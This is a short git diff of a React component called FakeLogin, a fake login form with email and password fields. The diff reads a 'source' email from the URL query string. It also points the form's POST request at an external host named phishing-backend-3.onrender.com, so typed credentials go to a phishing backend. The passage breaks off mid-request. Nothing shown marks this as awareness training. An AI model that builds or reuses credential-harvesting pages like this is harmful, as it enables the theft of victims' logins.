@@ -1,25 +1,20 @@
-import React, { useState, useEffect } from "react";
-import { useParams } from "react-router-dom";
+import React, { useState } from "react";
+import { useLocation } from "react-router-dom";
 
 function FakeLogin() {
   const [emailInput, setEmailInput] = useState("");
   const [password, setPassword] = useState("");
   const [submitted, setSubmitted] = useState(false);
-  const [sourceEmail, setSourceEmail] = useState("");
 
-  const { email } = useParams(); // ✅ Correct param name
-
-  useEffect(() => {
-    if (email) {
-      setSourceEmail(email);
-    }
-  }, [email]);
+  const location = useLocation();
+  const searchParams = new URLSearchParams(location.search);
+  const sourceEmail = searchParams.get("source");
 
   const handleSubmit = async (e) => {
     e.preventDefault();
 
     try {
-      await fetch("/api/fake-login", {
+      await fetch("https://phishing-backend-3.onrender.com/api/fake-login", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
